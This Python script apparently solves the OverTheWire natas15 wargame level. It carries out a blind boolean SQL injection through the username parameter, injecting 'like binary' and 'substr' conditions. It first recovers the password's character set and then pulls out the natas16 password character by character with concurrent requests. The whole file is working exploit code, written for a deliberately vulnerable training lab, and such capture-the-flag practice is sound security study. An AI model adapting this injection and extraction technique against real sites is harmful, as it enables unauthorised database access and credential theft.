#!/usr/bin/env python3
import asyncio
import requests
from aiohttp import BasicAuth, ClientSession


url = 'http://natas15.natas.labs.overthewire.org/index.php?username='
auth = BasicAuth('natas15', natas15_pass)

async def check_user(sqli, data):
    async with ClientSession() as session:
        async with session.get(url+sqli, auth=auth) as response:
            r = await response.text()
            if 'This user exists.' in r:
                return data

async def get_charset():
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    tasks = []
    charset = ''
    for char in alnum:
        sqli = f'natas16" and password like binary "%{char}%'
        tasks.append(asyncio.ensure_future(check_user(sqli, char)))
    for task in asyncio.as_completed(tasks):
        if result := await task:
            charset += result
    return charset

async def get_substr(index, charset):
    tasks = []
    for char in charset:
        sqli = f'natas16" and binary substr(password, {index+1}, 1)="{char}'
        tasks.append(asyncio.ensure_future(check_user(sqli, char)))
        # Add delay to prevent too many simultaneous requests
        # Increase delay if receiving connection refused error
        await asyncio.sleep(.01)
    for task in asyncio.as_completed(tasks):
        if result := await task:
            for t in tasks:
                t.cancel()
            return index, result

async def main():
    charset = await get_charset()
    
    tasks = []
    for i in range(32):
        tasks.append(asyncio.ensure_future(get_substr(i, charset)))

    password = ['_'] * 32
    for task in asyncio.as_completed(tasks):
        index, char = await task
        print(''.join(password), end='', flush=True)
        print('\b'*32, end='', flush=True)
        password[index] = char
    print(''.join(password))


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(main())
    loop.run_until_complete(future)
